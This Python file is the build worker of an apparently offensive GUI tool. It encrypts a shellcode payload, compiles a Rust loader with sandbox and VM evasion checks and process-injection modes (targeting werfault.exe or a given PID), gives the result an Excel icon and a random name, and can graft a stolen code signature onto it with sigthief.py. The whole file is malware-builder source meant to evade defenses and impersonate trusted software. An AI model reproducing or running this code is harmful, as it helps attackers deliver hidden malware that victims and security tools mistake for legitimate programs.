import os
import sys
import subprocess
import shutil
import platform
from PyQt5.QtCore import QThread, pyqtSignal
from .config_manager import (
    load_plugins_manifest,
    get_encryption_map,
    get_vm_checks_map,
    get_encryption_feature_map,
    get_run_mode_map,
    get_alloc_mem_feature_map,
    get_encoding_feature_map,
    get_load_payload_feature_map,
    get_default_value
)


class WorkerThread(QThread):
    log_signal = pyqtSignal(str)
    progress_signal = pyqtSignal(int)
    done_signal = pyqtSignal(str)
    error_signal = pyqtSignal(str)
    
    def __init__(self, parent, params):
        super().__init__(parent)
        self.params = params

    def run(self):
        try:
            self._encrypt_payload()
            self._build_rust_project()
            output_file = self._copy_output()
            if self.params['sign_enable']:
                self._sign_executable(output_file)
            self.progress_signal.emit(100)
            self.log_signal.emit('全部完成！')
            self.done_signal.emit(output_file)
        except Exception as e:
            self.error_signal.emit(str(e))

    def _encrypt_payload(self):
        self.progress_signal.emit(0)
        self.log_signal.emit('加密中...')
        self.progress_signal.emit(10)
        
        enc_map = get_encryption_map()
        enc_method_arg = enc_map.get(
            self.params['enc_method'], 
            self.params['enc_method']
        )
        
        enc_cmd = [
            sys.executable, 'encrypt.py',
            '-i', self.params['input_bin'],
            '-o', 'src/encrypt.bin',
            '-m', enc_method_arg,
            '-e', self.params.get('encode_method', 'base64')
        ]
        
        result = subprocess.run(enc_cmd, capture_output=True, text=True, check=True)
        self.log_signal.emit(result.stdout)
        if result.stderr:
            self.log_signal.emit(result.stderr)
        
        self.progress_signal.emit(40)

    def _build_rust_project(self):
        self.log_signal.emit('Rust 构建中...')
        
        self.target = self.params.get('target', 'x86_64-pc-windows-msvc')
        
        features = self._build_features_list()
        features_str = ','.join(features)
        
        self.log_signal.emit(f'本次编译启用 features: {features_str}')
        self.log_signal.emit(f'编译目标: {self.target}')
        
        manifest = load_plugins_manifest()
        run_modes = manifest['run_modes']
        run_mode_id = self.params['run_mode']
        pattern = 1
        for rm in run_modes:
            if rm['id'] == run_mode_id:
                pattern = rm.get('pattern', 1)
                break
        
        env_vars = {}
        if pattern == 2:
            env_vars['RSL_TARGET_PROGRAM'] = self.params.get('target_program', r'C:\Windows\System32\werfault.exe')
        elif pattern == 3:
            env_vars['RSL_TARGET_PID'] = self.params.get('target_pid', '0')
        
        env_vars['RSL_ICON_PATH'] = self.params.get('icon_path', 'icons/excel.ico')
        
        env_cmd_parts = []
        for key, value in env_vars.items():
            env_cmd_parts.append(f'set "{key}={value}" && ')
        
        build_cmd_str = ' '.join([
            'cargo', 'build', '--release',
            '--no-default-features',
            '--target', self.target,
            f'--features={features_str}'
        ])
        
        full_cmd = ''.join(env_cmd_parts) + build_cmd_str
        
        result = subprocess.run(full_cmd, shell=True, capture_output=True, text=True, check=True)
        self.log_signal.emit(result.stdout)
        if result.stderr:
            self.log_signal.emit(result.stderr)
        
        self.progress_signal.emit(50)

    def _build_features_list(self):
        manifest = load_plugins_manifest()
        features = []
        
        vm_map = get_vm_checks_map()
        selected = self.params.get('vm_checks', '').split(',') if self.params.get('vm_checks') else []
        features.extend([vm_map[t] for t in selected if t in vm_map])
        
        enc_feature_map = get_encryption_feature_map()
        default_enc = get_default_value('encryption') or 'chacha20-aes'
        enc_feature = enc_feature_map.get(
            self.params.get('enc_method', default_enc),
            'decrypt_chacha20_aes'
        )
        features.append(enc_feature)
        
        encoding_feature_map = get_encoding_feature_map()
        default_encoding = get_default_value('encoding') or 'base64'
        encoding_feature = encoding_feature_map.get(
            self.params.get('encode_method', default_encoding),
            'base64_decode'
        )
        features.append(encoding_feature)
        
        run_map = get_run_mode_map()
        default_run = get_default_value('run_mode') or 'enum_ui'
        run_feature = run_map.get(
            self.params.get('run_mode', default_run),
            'run_enum_ui'
        )
        features.append(run_feature)
        
        mem_feature_map = get_alloc_mem_feature_map()
        default_mem = get_default_value('alloc_mem_mode') or 'alloc_mem_va'
        mem_mode = self.params.get('mem_mode', default_mem)
        mem_feature = mem_feature_map.get(mem_mode, 'alloc_mem_va')
        features.append(mem_feature)
        
        load_payload_map = get_load_payload_feature_map()
        default_load = get_default_value('load_payload_mode') or 'read_from_self'
        load_mode = self.params.get('load_payload_mode', default_load)
        load_feature = load_payload_map.get(load_mode, 'load_payload_read_from_self')
        features.append(load_feature)
        
        if self.params.get('forgery_enable'):
            features.append('with_forgery')
        
        if self.params.get('win7_compat', False):
            features.append('win7')
        
        return features

    def _copy_output(self):
        self.log_signal.emit('复制输出...')
        
        src_file = os.path.join('target', self.target, 'release', 'rsl.exe')
        out_dir = 'output'
        
        if not os.path.exists(out_dir):
            os.makedirs(out_dir)
        
        import random
        import string
        rand_name = ''.join(random.choices(string.ascii_letters, k=6)) + '.exe'
        dst_file = os.path.join(out_dir, rand_name)
        
        if not os.path.exists(src_file):
            raise FileNotFoundError(src_file)
        
        shutil.copyfile(src_file, dst_file)
        self.log_signal.emit(f'已复制并重命名: {dst_file}')
        
        return dst_file

    def _sign_executable(self, dst_file):
        app_path = self.params['sign_app']
        if not app_path:
            raise ValueError('未选择被伪造应用的路径！')
        
        sign_out_file = dst_file[:-4] + '_signed.exe'
        sign_cmd = [
            sys.executable,
            os.path.join('sign', 'sigthief.py'),
            '-i', app_path,
            '-t', dst_file,
            '-o', sign_out_file
        ]
        
        result = subprocess.run(sign_cmd, capture_output=True, text=True, check=True)
        self.log_signal.emit(result.stdout)
        if result.stderr:
            self.log_signal.emit(result.stderr)
        
        shutil.move(sign_out_file, dst_file)
        self.log_signal.emit(f'伪造签名完成: {dst_file}')